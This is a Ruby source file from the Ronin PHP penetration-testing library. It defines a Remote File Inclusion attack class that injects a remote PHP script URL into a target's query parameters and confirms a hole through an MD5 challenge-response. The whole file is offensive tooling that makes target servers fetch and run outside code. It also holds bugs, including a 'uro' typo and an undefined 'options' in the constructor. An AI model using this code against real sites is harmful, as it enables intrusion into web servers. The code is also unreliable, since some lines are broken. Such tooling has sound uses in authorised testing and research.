#
# Ronin PHP - A Ruby library for Ronin that provides support for PHP
# related security tasks.
#
# Copyright (c) 2007-2010 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#

require 'ronin/attacks/web'

require 'digest/md5'
require 'chars'

module Ronin
  module Attacks
    #
    # Represents Remote File Inclusion (RFI) attacks.
    #
    class RFI < Web

      # Default URL of the RFI Test script
      TEST_SCRIPT = 'http://ronin-ruby.github.com/downloads/rfi_test.php'

      # Whether to terminate the RFI script url with a null byte
      property :terminate, Boolean

      # URL of the RFI Test script
      attr_accessor :test_script

      #
      # Creates a new RFI object.
      #
      # @param [Hash] attributes
      #   Attributes for the RFI object.
      #
      # @option attributes [Boolean] :terminate (true)
      #   Specifies whether to terminate the RFI script URL
      #   with a `?`.
      #
      # @option attributes [URI::HTTP, String] :test_script (RFI.test_script)
      #   The URL of the RFI test script.
      #
      def initialize(attributes={})
        @test_script = (options.delete(:test_script) || RFI.test_script)

        super(attributes)
      end

      #
      # Specifies the URL to the RFI testing script.
      #
      # @return [String]
      #   The URL to the RFI testing script.
      #
      # @since 0.1.4
      #
      def RFI.test_script
        @@test_script ||= TEST_SCRIPT
      end

      #
      # Uses a new URL for the RFI testing script.
      #
      # @param [String] new_url
      #   The new URL to the RFI testing script.
      #
      # @return [String]
      #   The new URL to the RFI testing script.
      #
      # @since 0.1.4
      #
      def RFI.test_script=(new_url)
        @@test_script = new_url
      end

      #
      # Tests the URL for RFI attacks.
      #
      # @param [URI::HTTP, String] url
      #   The URL to test.
      #
      # @param [Hash] options
      #   Additional options.
      #
      # @yield [rfi]
      #   The given block will be passed the first discovered RFI attack.
      #
      # @yieldparam [RFI] rfi
      #   The first discovered RFI vulnerability.
      #
      # @return [Enumerator]
      #   If no block is given, an enumerator object will be returned.
      #
      # @since 0.2.0
      #
      def self.test(uri,options={})
        return enum_for(:test,uri,options) unless block_given?

        uri = URI(uri.to_s) unless uro.kind_of?(URI)
        url = URL.from(uri)

        uri.query_params.each do |name,value|
          rfi = new(options.merge(
            :url           => url,
            :query_param   => name,
            :original_data => value
          ))

          if rfi.vulnerable?
            yield rfi
            break
          end
        end
      end

      def inject(script_url)
        if terminate?
          "#{script_url}?"
        else
          script_url
        end
      end

      def attack_uri(script_uri,params={})
        uri = super(script_uri)

        # always merge any specified params
        uri.query_params.merge!(params)

        return uri
      end

      def attack_headers(script_uri,params={})
        # let attack_uri handle the params
        super(script_uri)
      end

      #
      # Tests whether the URL and query parameter are vulnerable to RFI.
      #
      # @return [Boolean]
      #   Specifies whether the URL and query parameter are vulnerable
      #   to RFI.
      #
      def vulnerable?(options={})
        challenge = Chars.alpha.random_string(10)
        response  = exploit!(@test_script, :test => challenge)

        return response.include?(Digest::MD5.hexdigest(challenge))
      end

    end
  end
end
